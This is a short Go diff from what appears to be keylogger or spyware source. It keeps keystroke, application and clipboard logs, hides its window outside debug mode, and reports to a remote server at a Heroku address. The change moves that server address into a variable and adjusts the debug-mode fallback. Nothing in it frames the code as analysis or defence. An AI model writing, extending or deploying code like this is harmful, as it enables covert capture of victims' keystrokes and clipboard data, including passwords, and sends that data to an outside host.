@@ -26,6 +26,7 @@ var (
 	keylog       = []string{}
 	applog       = []string{}
 	clipboardlog = []string{}
+	publicAddr   = "dragons-land.herokuapp.com"
 	debug        bool
 	addr         string
 )
@@ -43,7 +44,7 @@ func HideWindow() {
 
 func init() {
 	flag.BoolVar(&debug, "debug", false, "Debug mode")
-	flag.StringVar(&addr, "addr", "dragons-land.herokuapp.com", "Address of the server.")
+	flag.StringVar(&addr, "addr", publicAddr, "Address of the server.")
 
 }
 
@@ -52,7 +53,9 @@ func main() {
 
 	if !debug {
 		HideWindow()
-	} else {
+	}
+
+	if debug && addr == publicAddr {
 		addr = "0.0.0.0"
 	}
 
